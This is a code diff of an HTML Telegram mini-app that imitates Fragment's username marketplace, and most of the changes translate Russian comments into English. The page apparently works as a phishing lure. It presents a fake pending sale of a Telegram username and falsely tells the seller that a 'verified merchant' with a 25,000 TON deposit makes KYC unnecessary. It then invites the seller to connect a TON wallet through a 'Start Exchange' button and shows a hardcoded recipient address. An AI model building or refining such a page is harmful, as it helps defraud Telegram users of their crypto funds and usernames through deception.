@@ -9,16 +9,15 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --bg-dark: #0f0f0f;           /* Основной фон */
-            --bg-card: #1a1a1a;            /* Фон карточек */
-            --text-primary: #ffffff;       /* Основной текст */
-            --text-secondary: #a0a0a0;     /* Вторичный текст */
-            --border: #2a2a2a;             /* Границы */
-            --primary: #bb6bd9;            /* Основной фиолетовый */
-            --accent: #2f80ed;             /* Акцентный синий */
-            --gradient: linear-gradient(135deg, #bb6bd9 0%, #2f80ed 100%); /* Градиент */
-            --success: #27ae60;            /* Цвет успеха */
-            --warning: #f2c94c;            /* Цвет предупреждения */
+            --bg-dark: #0f0f0f;
+            --bg-card: #1a1a1a;
+            --text-primary: #ffffff;
+            --text-secondary: #a0a0a0;
+            --border: #2a2a2a;
+            --primary: #bb6bd9;
+            --accent: #2f80ed;
+            --gradient: linear-gradient(135deg, #bb6bd9 0%, #2f80ed 100%);
+            --success: #27ae60;
         }
         
         * {
@@ -43,7 +42,7 @@
             padding: 15px;
         }
         
-        /* Шапка Fragment */
+        /* Header */
         .header {
             display: flex;
             align-items: center;
@@ -95,7 +94,7 @@
             font-size: 16px;
         }
         
-        /* Основной контент */
+        /* Main Content */
         .section-title {
             display: flex;
             align-items: center;
@@ -156,7 +155,7 @@
             color: var(--text-secondary);
         }
         
-        /* Информационные блоки */
+        /* Info Section */
         .info-container {
             margin-bottom: 25px;
         }
@@ -182,7 +181,7 @@
             font-size: 15px;
         }
         
-        /* Кнопка */
+        /* Button */
         .action-btn {
             background: var(--gradient);
             color: white;
@@ -206,7 +205,7 @@
             box-shadow: 0 5px 15px rgba(187, 107, 217, 0.4);
         }
         
-        /* Примечание */
+        /* Note Section */
         .note {
             background: rgba(47, 128, 237, 0.1);
             border-left: 3px solid var(--accent);
@@ -226,7 +225,7 @@
             font-weight: 600;
         }
         
-        /* Торговая информация */
+        /* Trade Info */
         .trade-info {
             margin-top: 25px;
         }
@@ -260,7 +259,7 @@
             word-break: break-all;
         }
         
-        /* Лоадер */
+        /* Loader */
         .loader {
             border: 4px solid rgba(255, 255, 255, 0.1);
             border-top: 4px solid var(--primary);
@@ -290,7 +289,7 @@
 </head>
 <body>
     <div class="container">
-        <!-- Шапка -->
+        <!-- Header -->
         <div class="header">
             <div class="logo">
                 <div class="logo-icon">F</div>
@@ -306,21 +305,21 @@
             </div>
         </div>
         
-        <!-- Заголовок секции -->
+        <!-- Section Title -->
         <div class="section-title">
             <i class="fas fa-search"></i>
             <span>Search usernames</span>
         </div>
         
-        <!-- Бейдж -->
+        <!-- Badge -->
         <div class="badge">
             <i class="fas fa-sync-alt fa-spin"></i> Deal In Progress
         </div>
         
-        <!-- Название юзернейма -->
+        <!-- Username Title -->
         <div class="username-title" id="usernameDisplay">cammiliss.t.me</div>
         
-        <!-- Цены -->
+        <!-- Pricing -->
         <div class="pricing-container">
             <div class="price-card">
                 <div class="price-label">Deal Price</div>
@@ -334,7 +333,7 @@
             </div>
         </div>
         
-        <!-- Информация -->
+        <!-- Information -->
         <div class="info-container">
             <div class="info-item">
                 <div class="info-label">How does this work?</div>
@@ -353,7 +352,7 @@
             </div>
         </div>
         
-        <!-- Кнопка -->
+        <!-- Action Button -->
         <button class="action-btn" id="startExchange">
             <i class="fas fa-exchange-alt"></i>
             Start Exchange
@@ -366,14 +365,14 @@
             <span>Subscribe to updates</span>
         </div>
         
-        <!-- Примечание -->
+        <!-- Note -->
         <div class="note">
             <div class="note-content">
                 You do not need to complete KYC verification, as the buyer is a verified merchant on a Fragment that has a security deposit of <span class="highlight">25,000 TON</span>.
             </div>
         </div>
         
-        <!-- Торговая информация -->
+        <!-- Trade Info -->
         <div class="trade-info">
             <div class="section-title">
                 <i class="fas fa-chart-line"></i>
@@ -407,11 +406,11 @@
             console.error("TON Connect initialization error:", e);
         }
         
-        // Настройка темной темы
+        // Set dark theme
         Telegram.setHeaderColor('#0f0f0f');
         Telegram.setBackgroundColor('#0f0f0f');
         
-        // Показываем загрузчик
+        // Show loader
         function showLoader(show) {
             const loader = document.getElementById('loader');
             const startBtn = document.getElementById('startExchange');
@@ -419,7 +418,7 @@
             if (startBtn) startBtn.disabled = show;
         }
         
-        // Парсинг параметров
+        // Parse start parameters
         function parseStartParams() {
             try {
                 if (Telegram.initDataUnsafe && Telegram.initDataUnsafe.start_param) {
@@ -440,11 +439,11 @@
             };
         }
         
-        // Обновление интерфейса
+        // Update UI
         function updateUI() {
             const { username, price, commission } = parseStartParams();
             
-            // Обновляем элементы
+            // Update elements
             document.getElementById('usernameDisplay').textContent = `${username}.t.me`;
             document.getElementById('usernameText').textContent = `@${username}`;
             document.getElementById('usernameLink').textContent = username;
@@ -452,19 +451,19 @@
             document.getElementById('commissionDisplay').textContent = `${commission} TON`;
             document.getElementById('tonAddress').textContent = `${username}.t.me`;
             
-            // Рассчитываем долларовые значения
+            // Calculate dollar values (1 TON = $2.90)
             const priceDollar = (parseFloat(price) * 2.90).toFixed(2);
             const commissionDollar = (parseFloat(commission) * 2.90).toFixed(2);
             document.getElementById('priceDollar').textContent = `~ $${priceDollar}`;
             document.getElementById('commissionDollar').textContent = `~ $${commissionDollar}`;
             
-            // Форматируем адрес получателя
+            // Format recipient address
             const fullAddress = "Ef_BbsF16B4aReCFhXIO1234567890abcdef";
             const formattedAddress = `${fullAddress.substring(0, 10)}...${fullAddress.substring(fullAddress.length - 10)}`;
             document.getElementById('recipientAddress').textContent = formattedAddress;
         }
         
-        // Обработка кнопки
+        // Handle button click
         document.getElementById('startExchange').addEventListener('click', async () => {
             showLoader(true);
             
@@ -522,11 +521,16 @@
             }
         });
         
-        // Инициализация приложения
+        // Initialize app
         Telegram.ready();
         Telegram.expand();
         Telegram.BackButton.hide();
         updateUI();
+        
+        // Cache busting
+        if (!window.location.search.includes('v=')) {
+            window.location.search += '&v=' + new Date().getTime();
+        }
     </script>
 </body>
 </html>
